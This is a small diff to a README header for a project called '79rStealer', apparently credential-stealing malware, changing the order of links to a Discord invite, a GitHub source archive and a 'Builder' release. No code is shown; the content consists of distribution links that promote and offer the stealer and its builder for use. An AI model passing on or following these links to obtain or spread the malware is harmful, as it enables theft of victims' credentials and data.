@@ -1,4 +1,4 @@
-#### ``-`` [Source](https://github.com/79r/79rStealer/archive/refs/heads/main.zip) ``-`` [Builder](https://discord.gg/Sh236kfpvK)
+#### ``-`` [Discord Link](https://discord.gg/Sh236kfpvK) ``-`` [Source](https://github.com/79r/79rStealer/archive/refs/heads/main.zip) ``-`` [Builder](https://github.com/79r/79rStealer/releases/tag/Builder) 
 
 
 # Features
